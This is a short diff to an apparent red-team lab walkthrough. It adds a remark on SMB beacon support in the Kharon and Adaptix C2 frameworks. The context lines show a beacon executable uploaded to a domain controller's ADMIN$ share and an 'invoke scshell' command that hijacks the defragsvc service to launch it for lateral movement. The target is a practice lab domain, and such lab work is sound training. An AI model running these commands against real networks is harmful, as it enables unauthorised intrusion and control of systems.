@@ -1402,6 +1402,9 @@ upload /local/path/to/http_x64.exe \\kingslanding.sevenkingdoms.local\ADMIN$\htt
 
 ![](image/red-team-workflow/20260922160121.png)
 
+> The SMB beacon would have been the best and realistic option for this, however Kharon Listener config doesn't yet support SMB. If you had to use the default Adaptix SMB beacon, run link smb <target_ip> <pipe_name> right after the command below to connect to the SMB beacon.
+
+
 ```
 invoke scshell kingslanding.sevenkingdoms.local defragsvc "C:\Windows\http_x64.exe"
 ```
